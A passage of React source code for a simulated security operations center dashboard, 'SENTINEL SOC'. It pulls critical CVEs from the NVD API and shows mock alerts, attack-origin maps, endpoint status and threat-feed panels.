        <canvas ref={cvRef} width={W} height={H} onMouseMove={onMM} onMouseLeave={()=>setTip(null)}
          style={{ cursor:"crosshair",display:"block" }}/>
      </div>
      {tip&&(
        <div style={{ position:"fixed",top:tip.y+14,left:tip.x+12,zIndex:9999,
          background:T.card,border:`1px solid ${T.line}`,borderRadius:4,
          padding:"8px 12px",fontFamily:"'JetBrains Mono',monospace",fontSize:11,
          pointerEvents:"none",boxShadow:"0 4px 20px rgba(0,0,0,0.7)" }}>
          <div style={{ color:T.cyan,marginBottom:3 }}>
            {tip.day} {tip.h.toString().padStart(2,"0")}:00 – {(tip.h+1).toString().padStart(2,"0")}:00
          </div>
          <div style={{ color:T.tp }}>Incidents: <b style={{ color:tip.v>30?T.red:tip.v>15?T.orange:T.tp }}>{tip.v}</b></div>
        </div>
      )}
    </Panel>
  );
}

/* ═══════════════════════════════════════════════
   LIVE CVE PANEL
═══════════════════════════════════════════════ */
function CVEPanel(){
  const [cves,setCves]=useState([]);
  const [loading,setLoading]=useState(true);
  const [lastUp,setLastUp]=useState(null);
  const [filter,setFilter]=useState("ALL");

  const load=useCallback(async()=>{
    setLoading(true);
    try{
      const since=new Date(Date.now()-14*86400000).toISOString().split(".")[0]+".000";
      const url=`https://services.nvd.nist.gov/rest/json/cves/2.0?pubStartDate=${since}&resultsPerPage=20&cvssV3Severity=CRITICAL`;
      const r=await fetch(url);
      if(!r.ok) throw new Error();
      const d=await r.json();
      const parsed=(d.vulnerabilities||[]).map(v=>{
        const cve=v.cve;
        const score=cve.metrics?.cvssMetricV31?.[0]?.cvssData?.baseScore||cve.metrics?.cvssMetricV30?.[0]?.cvssData?.baseScore||null;
        const sev=score>=9?"CRITICAL":score>=7?"HIGH":score>=4?"MEDIUM":"LOW";
        const desc=(cve.descriptions?.find(d=>d.lang==="en")?.value||"No description.").slice(0,115);
        return{id:cve.id,score,sev,desc:desc+"…",pub:cve.published?.slice(0,10)||"—"};
      }).filter(c=>c.score!==null).sort((a,b)=>b.score-a.score);
      setCves(parsed.length?parsed:FALLBACK_CVES);
      setLastUp(new Date());
    }catch{setCves(FALLBACK_CVES);setLastUp(new Date());}
    setLoading(false);
  },[]);

  useEffect(()=>{load();const id=setInterval(load,21600000);return()=>clearInterval(id);},[load]);
  const shown=filter==="ALL"?cves:cves.filter(c=>c.sev===filter);

  return(
    <Panel title="⚡ LIVE CVE INTELLIGENCE — NVD FEED" accent={T.red}
      action={<div style={{ display:"flex",gap:8,alignItems:"center" }}>
        {lastUp&&<span style={{ fontSize:9,color:T.td,fontFamily:"'JetBrains Mono',monospace" }}>{lastUp.toLocaleTimeString()}</span>}
        <Dot color={T.green} pulse/>
      </div>}>
      <div style={{ display:"flex",gap:6,marginBottom:12 }}>
        {["ALL","CRITICAL","HIGH","MEDIUM","LOW"].map(s=>(
          <button key={s} onClick={()=>setFilter(s)}
            style={{ padding:"3px 10px",border:`1px solid ${filter===s?(sc(s)||T.cyan):T.border}`,
              borderRadius:3,background:filter===s?`${sc(s)||T.cyan}18`:"transparent",
              color:filter===s?(sc(s)||T.cyan):T.ts,fontFamily:"'JetBrains Mono',monospace",
              fontSize:9,letterSpacing:1,cursor:"pointer" }}>{s}</button>
        ))}
        <button onClick={load} style={{ marginLeft:"auto",padding:"3px 10px",border:`1px solid ${T.border}`,
          borderRadius:3,background:"transparent",color:T.ts,fontFamily:"'JetBrains Mono',monospace",
          fontSize:9,cursor:"pointer" }}>↻ REFRESH</button>
      </div>
      {loading?(
        <div style={{ textAlign:"center",padding:"22px 0",fontSize:11,color:T.ts,fontFamily:"'JetBrains Mono',monospace" }}>
          Fetching from NVD API…
        </div>
      ):(
        <div style={{ overflowX:"auto" }}>
          <table style={{ width:"100%",borderCollapse:"collapse",fontFamily:"'JetBrains Mono',monospace",fontSize:11 }}>
            <thead><tr style={{ borderBottom:`1px solid ${T.border}` }}>
              {["CVE ID","CVSS","SEV","PUBLISHED","DESCRIPTION"].map(h=>(
                <th key={h} style={{ padding:"5px 10px",textAlign:"left",color:T.ts,fontSize:9,letterSpacing:1.5,fontWeight:400 }}>{h}</th>
              ))}
            </tr></thead>
            <tbody>
              {shown.map((c,i)=>(
                <tr key={c.id} style={{ borderBottom:`1px solid ${T.border}44`,background:i%2===0?"transparent":`${T.surface}55` }}>
                  <td style={{ padding:"7px 10px",color:T.cyan,whiteSpace:"nowrap" }}>{c.id}</td>
                  <td style={{ padding:"7px 10px",color:sc(c.sev),fontWeight:700 }}>{c.score?.toFixed(1)}</td>
                  <td style={{ padding:"7px 10px" }}><SevBadge sev={c.sev}/></td>
                  <td style={{ padding:"7px 10px",color:T.ts,whiteSpace:"nowrap" }}>{c.pub}</td>
                  <td style={{ padding:"7px 10px",color:T.tp,maxWidth:400 }}>{c.desc}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </Panel>
  );
}

/* ═══════════════════════════════════════════════
   DASHBOARD TAB
═══════════════════════════════════════════════ */
function DashboardTab({liveAlerts,setLiveAlerts,trend}){
  const [selAlert,setSA]=useState(null);
  const [investAlert,setIA]=useState(null);

  const handleNeutralize=id=>{
    setLiveAlerts(prev=>prev.map(a=>a.id===id?{...a,neutralized:true,status:"CLOSED",analyst:"YOU"}:a));
  };

  return(
    <div style={{ display:"flex",flexDirection:"column",gap:14 }}>
      <div style={{ display:"grid",gridTemplateColumns:"1fr 1fr 310px",gap:14 }}>
        <Panel title="📈 EVENT VOLUME — 24H" accent={T.cyan} action={<Dot color={T.green} pulse/>}>
          <ResponsiveContainer width="100%" height={175}>
            <AreaChart data={trend} margin={{top:4,right:4,left:-22,bottom:0}}>
              <defs>
                {[["ev",T.cyan],["al",T.orange],["cr",T.red]].map(([id,c])=>(
                  <linearGradient key={id} id={id} x1="0" y1="0" x2="0" y2="1">
                    <stop offset="5%" stopColor={c} stopOpacity={0.28}/><stop offset="95%" stopColor={c} stopOpacity={0}/>
                  </linearGradient>
                ))}
              </defs>
              <CartesianGrid strokeDasharray="2 4" stroke={T.border} vertical={false}/>
              <XAxis dataKey="time" tick={{fill:T.ts,fontSize:8,fontFamily:"'JetBrains Mono'"}} axisLine={false} tickLine={false} interval={5}/>
              <YAxis tick={{fill:T.ts,fontSize:8,fontFamily:"'JetBrains Mono'"}} axisLine={false} tickLine={false}/>
              <Tooltip content={<ChartTip/>}/>
              <Area type="monotone" dataKey="events" name="Events" stroke={T.cyan} fill="url(#ev)" strokeWidth={1.5} dot={false}/>
              <Area type="monotone" dataKey="alerts" name="Alerts" stroke={T.orange} fill="url(#al)" strokeWidth={1.5} dot={false}/>
              <Area type="monotone" dataKey="critical" name="Critical" stroke={T.red} fill="url(#cr)" strokeWidth={1.5} dot={false}/>
            </AreaChart>
          </ResponsiveContainer>
          <div style={{ display:"flex",gap:14,justifyContent:"center",marginTop:6 }}>
            {[["Events",T.cyan],["Alerts",T.orange],["Critical",T.red]].map(([l,c])=>(
              <span key={l} style={{ display:"flex",alignItems:"center",gap:5,fontFamily:"'JetBrains Mono',monospace",fontSize:9,color:T.ts }}>
                <span style={{ display:"inline-block",width:16,height:2,background:c }}/>{l}
              </span>
            ))}
          </div>
        </Panel>

        <Panel title="📊 ALERT VOLUME — LAST 12H" accent={T.orange}>
          <ResponsiveContainer width="100%" height={185}>
            <BarChart data={trend.slice(-12)} margin={{top:4,right:4,left:-22,bottom:0}}>
              <CartesianGrid strokeDasharray="2 4" stroke={T.border} vertical={false}/>
              <XAxis dataKey="time" tick={{fill:T.ts,fontSize:8,fontFamily:"'JetBrains Mono'"}} axisLine={false} tickLine={false}/>
              <YAxis tick={{fill:T.ts,fontSize:8,fontFamily:"'JetBrains Mono'"}} axisLine={false} tickLine={false}/>
              <Tooltip content={<ChartTip/>}/>
              <Bar dataKey="alerts" name="Alerts" radius={[2,2,0,0]}>
                {trend.slice(-12).map((e,i)=><Cell key={i} fill={e.alerts>120?T.red:e.alerts>80?T.orange:T.cyan} opacity={0.82}/>)}
              </Bar>
            </BarChart>
          </ResponsiveContainer>
        </Panel>

        <Panel title="🗂️ ALERT CATEGORIES" accent={T.ts}>
          <ResponsiveContainer width="100%" height={158}>
            <PieChart>
              <Pie data={ALERT_CATS} dataKey="value" cx="50%" cy="50%"
                innerRadius={44} outerRadius={68} paddingAngle={2} startAngle={90} endAngle={-270}>
                {ALERT_CATS.map((e,i)=><Cell key={i} fill={e.fill} opacity={0.88}/>)}
              </Pie>
              <Tooltip content={<PieTip/>} wrapperStyle={{zIndex:9999,outline:"none"}}/>
            </PieChart>
          </ResponsiveContainer>
          <div style={{ display:"flex",flexDirection:"column",gap:4,marginTop:2 }}>
            {ALERT_CATS.map(c=>(
              <div key={c.name} style={{ display:"flex",alignItems:"center",justifyContent:"space-between" }}>
                <div style={{ display:"flex",alignItems:"center",gap:6 }}>
                  <div style={{ width:8,height:8,borderRadius:2,background:c.fill }}/>
                  <span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:9,color:T.ts }}>{c.name}</span>
                </div>
                <span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:9,color:c.fill }}>{c.value}%</span>
              </div>
            ))}
          </div>
        </Panel>
      </div>

      <div style={{ display:"grid",gridTemplateColumns:"1fr 290px",gap:14 }}>
        <Panel title="🚨 LIVE SECURITY ALERTS — CLICK TO INVESTIGATE" accent={T.red}
          action={<span style={{ fontSize:9,color:T.ts,fontFamily:"'JetBrains Mono'" }}>
            {liveAlerts.filter(a=>!a.neutralized&&a.status!=="CLOSED").length} OPEN
          </span>}>
          <AlertTable alerts={liveAlerts.slice(0,8)} onSelect={setSA} selected={selAlert} compact/>
        </Panel>
        <div style={{ display:"flex",flexDirection:"column",gap:14 }}>
          <Panel title="🌍 TOP ATTACK ORIGINS" accent={T.orange}>
            {GEO_ATTACKS.slice(0,7).map(g=>(
              <div key={g.city} style={{ display:"flex",alignItems:"center",gap:8,padding:"6px 8px",
                background:T.surface,borderRadius:3,marginBottom:5,borderLeft:`2px solid ${sc(g.sev)}` }}>
                <Dot color={sc(g.sev)} pulse={g.sev==="CRITICAL"} size={6}/>
                <div style={{ flex:1 }}>
                  <div style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:10,color:T.tp }}>{g.city}, {g.country}</div>
                  <div style={{ height:2,background:T.border,borderRadius:1,marginTop:3 }}>
                    <div style={{ width:`${(g.count/1842)*100}%`,height:"100%",background:sc(g.sev),borderRadius:1 }}/>
                  </div>
                </div>
                <span style={{ fontFamily:"'Rajdhani',sans-serif",fontSize:13,fontWeight:700,color:sc(g.sev) }}>{g.count.toLocaleString()}</span>
              </div>
            ))}
          </Panel>
          <Panel title="📡 THREAT FEED" accent={T.purple}>
            {FEED.slice(0,4).map((f,i)=>(
              <div key={i} style={{ padding:"6px 8px",background:T.surface,borderRadius:3,
                marginBottom:5,borderLeft:`2px solid ${sc(f.sev)}` }}>
                <div style={{ display:"flex",gap:5,alignItems:"center",marginBottom:3 }}>
                  <span style={{ fontSize:10 }}>{f.icon}</span><SevBadge sev={f.sev}/>
                  <span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:9,color:T.ts,marginLeft:"auto" }}>{f.ts}</span>
                </div>
                <div style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:9,color:T.tp,lineHeight:1.5 }}>
                  {f.msg.slice(0,85)}{f.msg.length>85?"…":""}
                </div>
              </div>
            ))}
          </Panel>
        </div>
      </div>

      <IncidentHeatmap/>

      <Panel title="💻 ENDPOINT STATUS" accent={T.cyan}>
        <div style={{ overflowX:"auto" }}>
          <table style={{ width:"100%",borderCollapse:"collapse",fontFamily:"'JetBrains Mono',monospace",fontSize:11 }}>
            <thead><tr style={{ borderBottom:`1px solid ${T.border}` }}>
              {["HOSTNAME","IP","OS","STATUS","RISK","LAST SEEN"].map(h=>(
                <th key={h} style={{ padding:"5px 9px",textAlign:"left",color:T.ts,fontSize:9,letterSpacing:1.5,fontWeight:400 }}>{h}</th>
              ))}
            </tr></thead>
            <tbody>
              {ENDPOINTS.map((e,i)=>{
                const stc={ISOLATED:T.red,INVESTIGATING:T.orange,SUSPICIOUS:T.yellow,ONLINE:T.green}[e.status]||T.ts;
                return(
                  <tr key={e.host} style={{ borderBottom:`1px solid ${T.border}44`,background:i%2===0?"transparent":`${T.surface}55` }}>
                    <td style={{ padding:"6px 9px",color:T.cyan }}>{e.host}</td>
                    <td style={{ padding:"6px 9px",color:T.ts }}>{e.ip}</td>
                    <td style={{ padding:"6px 9px",color:T.ts }}>{e.os}</td>
                    <td style={{ padding:"6px 9px" }}><span style={{ display:"inline-flex",alignItems:"center",gap:5,color:stc }}><Dot color={stc} pulse={e.status!=="ONLINE"} size={6}/>{e.status}</span></td>
                    <td style={{ padding:"6px 9px",minWidth:130 }}>
                      <div style={{ display:"flex",alignItems:"center",gap:7 }}>
                        <div style={{ flex:1,height:4,background:T.border,borderRadius:2 }}>
                          <div style={{ width:`${e.risk}%`,height:"100%",borderRadius:2,background:e.risk>75?T.red:e.risk>40?T.orange:T.green }}/>
                        </div>
                        <span style={{ color:e.risk>75?T.red:e.risk>40?T.orange:T.green,minWidth:22 }}>{e.risk}</span>
                      </div>
                    </td>
                    <td style={{ padding:"6px 9px",color:T.ts }}>{e.seen}</td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      </Panel>

      <AlertDrawer alert={selAlert} onClose={()=>setSA(null)} onInvestigate={setIA} alerts={liveAlerts} setAlerts={setLiveAlerts}/>
      {investAlert&&<InvestigationModal alert={investAlert} onClose={()=>setIA(null)} onNeutralize={handleNeutralize}/>}
    </div>
  );
}

/* ═══════════════════════════════════════════════
   MAIN DASHBOARD SHELL
═══════════════════════════════════════════════ */
function Dashboard(){
  const {user,logout}=useAuth();
  const [tab,setTab]=useState("dashboard");
  const [showProfile,setSP]=useState(false);
  const [liveAlerts,setLA]=useState(()=>makeAlerts());
  const [selAlert,setSA]=useState(null);
  const [investAlert,setIA]=useState(null);
  const trend=useMemo(()=>makeTrend(),[]);

  useEffect(()=>{
    const base=makeAlerts();
    const id=setInterval(()=>{
      if(Math.random()>0.6){
        const s=base[Math.floor(Math.random()*5)];
        setLA(p=>[{...s,id:`ALT-${8900+Math.floor(Math.random()*999)}`,ts:new Date(),status:"OPEN",analyst:"Unassigned",neutralized:false},...p.slice(0,28)]);
      }
    },9000);
    return()=>clearInterval(id);
  },[]);

  const handleNeutralize=id=>{
    setLA(prev=>prev.map(a=>a.id===id?{...a,neutralized:true,status:"CLOSED",analyst:"YOU"}:a));
  };

  const openCount=liveAlerts.filter(a=>!a.neutralized&&a.status!=="CLOSED").length;
  const critCount=liveAlerts.filter(a=>a.sev==="CRITICAL"&&!a.neutralized).length;
  const neutralized=liveAlerts.filter(a=>a.neutralized).length;

  const TABS=[["dashboard","Dashboard"],["alerts","Alerts"],["missions","Missions"],
    ["cves","CVE Intel"],["map","Attack Map"],["endpoints","Endpoints"],["threat-intel","Threat Intel"]];

  return(
    <div style={{ minHeight:"100vh",background:T.bg,fontFamily:"'Rajdhani',sans-serif",color:T.tp }}>
      {/* TOP BAR */}
      <div style={{ background:T.surface,borderBottom:`1px solid ${T.border}`,padding:"0 22px",
        position:"sticky",top:0,zIndex:100,boxShadow:"0 2px 20px rgba(0,0,0,0.7)" }}>
        <div style={{ maxWidth:1600,margin:"0 auto",display:"flex",alignItems:"center",height:50 }}>
          <div style={{ display:"flex",alignItems:"center",gap:9,marginRight:22,flexShrink:0 }}>
            <span style={{ fontSize:17 }}>🛡️</span>
            <div>
              <div style={{ fontFamily:"'Rajdhani',sans-serif",fontSize:14,fontWeight:700,color:T.cyan,letterSpacing:4,lineHeight:1 }}>SENTINEL SOC</div>
              <div style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:7,color:T.ts,letterSpacing:3 }}>v3.2.1 · PRODUCTION</div>
            </div>
          </div>
          <nav style={{ display:"flex",gap:0,flex:1 }}>
            {TABS.map(([id,lbl])=>(
              <button key={id} onClick={()=>setTab(id)}
                style={{ padding:"5px 11px",border:"none",background:"transparent",
                  borderBottom:tab===id?`2px solid ${T.cyan}`:"2px solid transparent",
                  color:tab===id?T.cyan:T.ts,fontFamily:"'JetBrains Mono',monospace",
                  fontSize:9,letterSpacing:1.5,cursor:"pointer",transition:"all 0.15s",textTransform:"uppercase" }}>
                {lbl}{id==="missions"&&<span style={{ marginLeft:4,background:T.purple,color:"#fff",
                  borderRadius:8,padding:"1px 5px",fontSize:8 }}>{MISSIONS_DATA.length}</span>}
              </button>
            ))}
          </nav>
          <div style={{ display:"flex",alignItems:"center",gap:12,flexShrink:0 }}>
            {critCount>0&&(
              <div style={{ display:"flex",alignItems:"center",gap:5,padding:"3px 9px",
                background:T.redG,border:`1px solid ${T.red}55`,borderRadius:4 }}>
                <Dot color={T.red} pulse/>
                <span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:9,color:T.red }}>{critCount} CRITICAL</span>
              </div>
            )}
            {neutralized>0&&(
              <div style={{ display:"flex",alignItems:"center",gap:5,padding:"3px 9px",
                background:T.greenG,border:`1px solid ${T.green}55`,borderRadius:4 }}>
                <span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:9,color:T.green }}>✓ {neutralized} NEUTRALIZED</span>
              </div>
            )}
            <LiveClock/>
            <button onClick={()=>setSP(true)}
              style={{ display:"flex",alignItems:"center",gap:8,padding:"4px 10px 4px 5px",
                background:T.panel,border:`1px solid ${T.border}`,borderRadius:20,
                cursor:"pointer",transition:"border-color 0.2s" }}
              onMouseEnter={e=>e.currentTarget.style.borderColor=T.cyan}
              onMouseLeave={e=>e.currentTarget.style.borderColor=T.border}>
              <div style={{ width:26,height:26,borderRadius:"50%",background:T.card,
                border:`1px solid ${T.cyan}44`,overflow:"hidden",display:"flex",
                alignItems:"center",justifyContent:"center",flexShrink:0 }}>
                {user.avatar?<img src={user.avatar} alt="av" style={{ width:"100%",height:"100%",objectFit:"cover" }}/>
                  :<span style={{ fontSize:12 }}>👤</span>}
              </div>
              <div style={{ textAlign:"left" }}>
                <div style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:11,color:T.tp,lineHeight:1 }}>{user.username}</div>
                <div style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:8,color:T.ts }}>{user.role}</div>
              </div>
            </button>
            <button onClick={logout}
              style={{ padding:"5px 12px",background:"transparent",border:`1px solid ${T.border}`,
                borderRadius:4,color:T.ts,fontFamily:"'JetBrains Mono',monospace",fontSize:9,
                letterSpacing:1.5,cursor:"pointer",transition:"all 0.2s" }}
              onMouseEnter={e=>{e.currentTarget.style.borderColor=T.red;e.currentTarget.style.color=T.red;}}
              onMouseLeave={e=>{e.currentTarget.style.borderColor=T.border;e.currentTarget.style.color=T.ts;}}>
              LOGOUT
            </button>
          </div>
        </div>
      </div>

      {/* KPI */}
      <div style={{ maxWidth:1600,margin:"0 auto",padding:"16px 22px 0" }}>
        <div style={{ display:"grid",gridTemplateColumns:"repeat(6,1fr)",gap:10,marginBottom:14 }}>
          <StatCard label="OPEN ALERTS"     value={openCount} sub="Requires triage"   color={T.red}    icon="🚨" blink={openCount>5}/>
          <StatCard label="CRITICAL"        value={critCount} sub="Immediate action"  color={T.red}    icon="💀"/>
          <StatCard label="NEUTRALIZED"     value={neutralized} sub="Threats stopped" color={T.green}  icon="✅"/>
          <StatCard label="MTTD (min)"      value="47"        sub="↓8 vs last week"   color={T.yellow} icon="⏱️"/>
          <StatCard label="BLOCKED 24H"     value="3,841"     sub="Threats stopped"   color={T.cyan}   icon="🛡️"/>
          <StatCard label="CVES TRACKED"    value="847"       sub="18 critical active" color={T.orange} icon="🔬"/>
        </div>
      </div>

      {/* CONTENT */}
      <div style={{ maxWidth:1600,margin:"0 auto",padding:"0 22px 30px" }}>
        {tab==="dashboard"  && <DashboardTab liveAlerts={liveAlerts} setLiveAlerts={setLA} trend={trend}/>}
        {tab==="missions"   && <MissionsTab/>}
        {tab==="alerts"     && (
          <Panel title="🚨 ALL SECURITY ALERTS" accent={T.red}
            action={<span style={{ fontSize:9,color:T.ts,fontFamily:"'JetBrains Mono'" }}>{openCount} OPEN</span>}>
            <AlertTable alerts={liveAlerts} onSelect={setSA} selected={selAlert}/>
            <AlertDrawer alert={selAlert} onClose={()=>setSA(null)} onInvestigate={setIA} alerts={liveAlerts} setAlerts={setLA}/>
            {investAlert&&<InvestigationModal alert={investAlert} onClose={()=>setIA(null)} onNeutralize={handleNeutralize}/>}
          </Panel>
        )}
        {tab==="cves"       && <CVEPanel/>}
        {tab==="map"        && (
          <div style={{ display:"flex",flexDirection:"column",gap:14 }}>
            <LeafletMap attacks={GEO_ATTACKS}/>
            <Panel title="📍 ATTACK SOURCE DETAILS" accent={T.orange}>
              <div style={{ overflowX:"auto" }}>
                <table style={{ width:"100%",borderCollapse:"collapse",fontFamily:"'JetBrains Mono',monospace",fontSize:11 }}>
                  <thead><tr style={{ borderBottom:`1px solid ${T.border}` }}>
                    {["CITY","COUNTRY","EVENTS","SEVERITY","LATITUDE","LONGITUDE"].map(h=>(
                      <th key={h} style={{ padding:"5px 10px",textAlign:"left",color:T.ts,fontSize:9,letterSpacing:1.5,fontWeight:400 }}>{h}</th>
                    ))}
                  </tr></thead>
                  <tbody>
                    {GEO_ATTACKS.map((g,i)=>(
                      <tr key={g.city} style={{ borderBottom:`1px solid ${T.border}44`,background:i%2===0?"transparent":`${T.surface}55` }}>
                        <td style={{ padding:"7px 10px",color:T.cyan }}>{g.city}</td>
                        <td style={{ padding:"7px 10px",color:T.tp }}>{g.country}</td>
                        <td style={{ padding:"7px 10px",color:sc(g.sev),fontWeight:700 }}>{g.count.toLocaleString()}</td>
                        <td style={{ padding:"7px 10px" }}><SevBadge sev={g.sev}/></td>
                        <td style={{ padding:"7px 10px",color:T.ts }}>{g.lat}°</td>
                        <td style={{ padding:"7px 10px",color:T.ts }}>{g.lng}°</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </Panel>
          </div>
        )}
        {tab==="endpoints"  && (
          <Panel title="💻 ENDPOINT INVENTORY" accent={T.cyan}>
            <div style={{ overflowX:"auto" }}>
              <table style={{ width:"100%",borderCollapse:"collapse",fontFamily:"'JetBrains Mono',monospace",fontSize:11 }}>
                <thead><tr style={{ borderBottom:`1px solid ${T.border}` }}>
                  {["HOSTNAME","IP ADDRESS","OS","STATUS","RISK SCORE","LAST SEEN"].map(h=>(
                    <th key={h} style={{ padding:"5px 10px",textAlign:"left",color:T.ts,fontSize:9,letterSpacing:1.5,fontWeight:400 }}>{h}</th>
                  ))}
                </tr></thead>
                <tbody>
                  {ENDPOINTS.map((e,i)=>{
                    const stc={ISOLATED:T.red,INVESTIGATING:T.orange,SUSPICIOUS:T.yellow,ONLINE:T.green}[e.status]||T.ts;
                    return(
                      <tr key={e.host} style={{ borderBottom:`1px solid ${T.border}44`,background:i%2===0?"transparent":`${T.surface}55` }}>
                        <td style={{ padding:"7px 10px",color:T.cyan }}>{e.host}</td>
                        <td style={{ padding:"7px 10px",color:T.ts }}>{e.ip}</td>
                        <td style={{ padding:"7px 10px",color:T.ts }}>{e.os}</td>
                        <td style={{ padding:"7px 10px" }}><span style={{ display:"inline-flex",alignItems:"center",gap:5,color:stc }}><Dot color={stc} pulse={e.status!=="ONLINE"} size={6}/>{e.status}</span></td>
                        <td style={{ padding:"7px 10px",minWidth:160 }}>
                          <div style={{ display:"flex",alignItems:"center",gap:8 }}>
                            <div style={{ flex:1,height:5,background:T.border,borderRadius:3 }}>
                              <div style={{ width:`${e.risk}%`,height:"100%",background:e.risk>75?T.red:e.risk>40?T.orange:T.green,borderRadius:3 }}/>
                            </div>
                            <span style={{ color:e.risk>75?T.red:e.risk>40?T.orange:T.green,minWidth:24 }}>{e.risk}</span>
                          </div>
                        </td>
                        <td style={{ padding:"7px 10px",color:T.ts }}>{e.seen}</td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </Panel>
        )}
        {tab==="threat-intel"&&(
          <div style={{ display:"flex",flexDirection:"column",gap:14 }}>
            <IncidentHeatmap/>
            <Panel title="📡 THREAT INTELLIGENCE FEED" accent={T.purple}>
              {FEED.map((f,i)=>(
                <div key={i} style={{ display:"flex",gap:12,padding:"11px 13px",marginBottom:8,
                  background:T.surface,borderRadius:4,borderLeft:`3px solid ${sc(f.sev)}` }}>
                  <span style={{ fontSize:16,flexShrink:0 }}>{f.icon}</span>
                  <div style={{ flex:1 }}>
                    <div style={{ display:"flex",gap:10,marginBottom:6,alignItems:"center" }}>
                      <SevBadge sev={f.sev}/>
                      <span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:9,color:T.ts }}>{f.ts}</span>
                    </div>
                    <div style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:11,color:T.tp,lineHeight:1.6 }}>{f.msg}</div>
                  </div>
                </div>
              ))}
            </Panel>
          </div>
        )}
      </div>

      {showProfile&&<ProfileModal onClose={()=>setSP(false)}/>}
    </div>
  );
}

/* ═══════════════════════════════════════════════
   ROOT
═══════════════════════════════════════════════ */
function AppInner(){
  const {user,ready}=useAuth();

  useEffect(()=>{
    const lk=document.createElement("link");
    lk.href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@700;900&display=swap";
    lk.rel="stylesheet"; document.head.appendChild(lk);
    const st=document.createElement("style");
    st.textContent=`
      *{box-sizing:border-box;margin:0;padding:0}
      body{background:#04090f;color:#c8dff0;overflow-x:hidden}
      ::-webkit-scrollbar{width:5px;height:5px}
      ::-webkit-scrollbar-track{background:#070d16}
      ::-webkit-scrollbar-thumb{background:#0f1e30;border-radius:2px}
      ::-webkit-scrollbar-thumb:hover{background:#162840}
      @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}}
      @keyframes blink{0%,100%{opacity:1}50%{opacity:.25}}
      input::placeholder,textarea::placeholder{color:#163050}
      input,textarea{caret-color:#00b8d9}
      button:focus{outline:none}
    `;
    document.head.appendChild(st);
    return()=>{ try{document.head.removeChild(lk);document.head.removeChild(st);}catch{} };
  },[]);

  if(!ready) return(
    <div style={{ minHeight:"100vh",background:"#04090f",display:"flex",alignItems:"center",
      justifyContent:"center",fontFamily:"'JetBrains Mono',monospace",fontSize:12,color:"#3d6a8a" }}>
      INITIALIZING SENTINEL SOC…
    </div>
  );
  return user?<Dashboard/>:<AuthScreen/>;
}

export default function App(){
  return <AuthProvider><AppInner/></AuthProvider>;
}

